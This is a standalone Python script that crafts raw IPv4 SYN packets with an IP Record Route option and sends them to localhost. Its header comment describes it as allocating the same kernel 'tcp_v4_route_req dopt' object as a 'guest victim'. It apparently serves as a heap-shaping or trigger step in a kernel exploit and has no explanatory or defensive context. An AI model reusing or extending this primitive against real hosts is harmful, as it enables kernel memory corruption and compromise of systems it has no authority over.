#!/usr/bin/env python3
# r7_doptsyn.py <sport> [n] -- host-local IPv4 SYN with an RR option, sent to
# 127.0.0.1:7778. Allocates the same tcp_v4_route_req dopt as a guest victim,
# without needing the L2. Root required.
import socket, struct, sys

def csum(d):
    if len(d) % 2: d += b"\0"
    s = sum(struct.unpack(">%dH" % (len(d)//2), d))
    while s >> 16: s = (s & 0xffff) + (s >> 16)
    return (~s) & 0xffff

def frame(sport, seq, src=b"\xc0\xa8\xfa\x72", dst=b"\x7f\x00\x00\x01", dport=22):
    hl = 32; thlen = 20
    ip = bytearray(hl + thlen)
    ip[0] = 0x48
    struct.pack_into(">H", ip, 2, len(ip))
    struct.pack_into(">H", ip, 4, 0x4242)
    ip[8] = 64; ip[9] = 6
    ip[12:16] = src; ip[16:20] = dst
    ip[20] = 7; ip[21] = 11; ip[22] = 12
    for i in range(23, 31): ip[i] = 0x40 + i
    ip[31] = 0
    th = memoryview(ip)[hl:]
    struct.pack_into(">HHII", th, 0, sport, dport, seq, 0)
    th[12] = 5 << 4; th[13] = 0x02
    struct.pack_into(">H", th, 14, 0x4000)
    pseudo = bytes(src) + bytes(dst) + b"\0" + bytes([6]) + struct.pack(">H", thlen)
    struct.pack_into(">H", th, 16, csum(pseudo + bytes(th[:thlen])))
    struct.pack_into(">H", ip, 10, 0)
    struct.pack_into(">H", ip, 10, csum(bytes(ip[:hl])))
    return bytes(ip)

s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
base = int(sys.argv[1]); n = int(sys.argv[2]) if len(sys.argv) > 2 else 1
dport = int(sys.argv[3]) if len(sys.argv) > 3 else 22
src = bytes.fromhex(sys.argv[4]) if len(sys.argv) > 4 else b"\x7f\x00\x00\x02"
for i in range(n):
    s.sendto(frame(base + i, 0x66000000 + i, src=src, dport=dport), ("127.0.0.1", 0))
    print("sent sport=%d dport=%d src=%s" % (base + i, dport, src.hex()))
